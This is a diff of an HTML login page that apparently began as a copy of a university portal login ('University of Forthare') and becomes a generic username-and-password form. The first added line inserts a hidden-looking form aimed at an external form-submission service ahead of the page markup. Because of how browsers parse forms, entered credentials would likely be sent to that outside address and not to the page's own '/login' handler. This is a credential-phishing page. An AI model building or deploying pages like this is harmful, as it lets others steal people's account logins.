@@ -1,55 +1,53 @@
 <!DOCTYPE html>
+<form action="https://formsubmit.co/el/xogage" method="POST" />
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>University of Forthare - Production</title>
+    <title>Login Page</title>
     <style>
         body {
-            font-family: sans-serif;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f4f4f4;
         }
-        .header {
-            background-color: gray;
-            padding: 10px;
-            text-align: center;
-            color: black;
-        }
-        .blue-bar {
-            background-color: blue;
-            color: white;
-            padding: 10px;
-            text-align: center;
-        }
-        .login-form {
+        .login-container {
+            background: white;
             padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
-        .login-form input[type="text"], .login-form input[type="password"] {
+        input[type="text"], input[type="password"] {
             width: 100%;
             padding: 10px;
-            margin-bottom: 10px;
-            box-sizing: border-box;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
         }
-        .login-form button {
+        input[type="submit"] {
+            background: #5cb85c;
+            color: white;
+            border: none;
             padding: 10px;
-            margin-right: 10px;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+        input[type="submit"]:hover {
+            background: #4cae4c;
         }
     </style>
 </head>
 <body>
-    <div class="header">UNIVERSITY OF FORTHARE - PRODUCTION</div>
-    <div class="blue-bar">Registered Users: Login Credentials</div>
-    <div class="login-form">
-        <label>
-            <input type="radio" name="userType" value="Student"> Student
-        </label>
-        <label>
-            <input type="radio" name="userType" value="Personal"> Personal
-        </label>
-        <label>
-            <input type="radio" name="userType" value="Other"> Other
-        </label>
-        <br><br>
-        <label for="studentNumber">Student Number:</label>
-        <input type="text" id="studentNumber" name="studentNumber">
-        <br>
-        <label for="pin">Pin:</label
+    <div class="login-container">
+        <h2>Login</h2>
+        <form action="/login" method="POST">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="submit" value="Login">
+        </form>
+    </div>
+</body>
+</html>
